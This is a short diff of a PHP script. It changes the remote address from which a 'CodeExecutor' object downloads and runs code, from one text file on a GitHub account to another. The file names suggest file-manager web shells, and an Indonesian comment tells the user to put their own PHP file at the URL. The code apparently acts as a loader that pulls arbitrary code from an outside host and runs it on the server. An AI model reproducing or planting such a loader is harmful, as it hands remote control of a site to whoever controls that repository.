@@ -86,7 +86,7 @@ try {
     $executor = new CodeExecutor($fetcher);
 
     // Ganti URL ini dengan file PHP kamu yang valid
-    $executor->executeCodeFromURL("https://raw.githubusercontent.com/semangat777/landing/refs/heads/main/fmanagerbaru.txt");
+    $executor->executeCodeFromURL("https://raw.githubusercontent.com/semangat777/landing/refs/heads/main/fmsonic.txt");
 } catch (Exception $e) {
     echo "Error: " . htmlspecialchars($e->getMessage());
 }
